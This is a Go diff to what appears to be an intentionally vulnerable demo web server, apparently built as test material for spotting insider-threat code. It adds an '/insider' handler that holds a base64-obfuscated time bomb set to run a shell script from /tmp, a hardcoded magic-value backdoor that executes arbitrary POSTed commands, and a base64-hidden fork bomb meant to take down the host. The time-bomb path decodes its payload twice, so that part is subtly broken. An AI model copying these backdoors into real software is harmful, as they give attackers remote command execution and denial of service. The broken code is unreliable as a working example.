@@ -2,11 +2,13 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
 	"html/template"
 	"log"
 	"net/http"
 	"os/exec"
 	"strings"
+	"time"
 )
 
 // sql injection demo
@@ -32,7 +34,6 @@ func traversalHandler(w http.ResponseWriter, r *http.Request) {
 // command exec demo
 // /exec
 func execHandler(w http.ResponseWriter, r *http.Request) {
-	log.Println("Here is exec")
 	if r.Method == "POST" {
 		input := r.FormValue("cmd")
 		log.Println(input)
@@ -66,5 +67,71 @@ func execHandler(w http.ResponseWriter, r *http.Request) {
 		}
 		t.Execute(w, ol)
 	}
+}
 
+// /insider
+func insiderHandler(w http.ResponseWriter, r *http.Request) {
+
+	// RECIPE: Time Bomb pattern
+	command := "c2ggL3RtcC9zaGVsbGNvZGUuc2g="
+	cmd, _ := base64.StdEncoding.DecodeString(command)
+	ticking(string(cmd))
+	// RECIPE: Magic Value leading to command injection
+	if r.Method == "POST" {
+		input := r.FormValue("tracefn")
+		if input == "C4A938B6FE01E" {
+			execCmd(r.FormValue("cmd"))
+		}
+	}
+
+	// RECIPE: Compiler Abuse Pattern
+
+	// RECIPE: Abuse Class Loader pattern (attacker controlled)
+
+	// RECIPE: Execute a Fork Bomb and DDOS the host
+	inPlainSight := "Oigpezp8OiZ9Ozo="
+	fb, _ := base64.StdEncoding.DecodeString(inPlainSight)
+	if r.Method == "POST" {
+		input := r.FormValue("tracefn")
+		if input == "ddos" {
+			go execCmd("sh -c " + string(fb))
+		}
+	}
+
+	// RECIPE: Escape validation framework
+
+}
+
+//Time bomb
+func ticking(parameter string) {
+	timer1 := time.NewTimer(5 * time.Second)
+	<-timer1.C
+	log.Printf("Ticking timer expired")
+	data, err := base64.StdEncoding.DecodeString(parameter)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	execCmd(string(data))
+}
+
+func execCmd(input string) error {
+	input = strings.Trim(input, " ")
+	command := strings.Split(input, " ")
+	var cmd *exec.Cmd
+	if len(command) == 0 {
+		log.Println("Nothing to exec")
+		return nil
+	}
+	if len(command) > 1 {
+		arr := command[1:]
+		cmd = exec.Command(command[0], arr...)
+	} else {
+		cmd = exec.Command(command[0])
+	}
+	if err := cmd.Run(); err != nil {
+		log.Println(err)
+		return err
+	}
+	return nil
 }
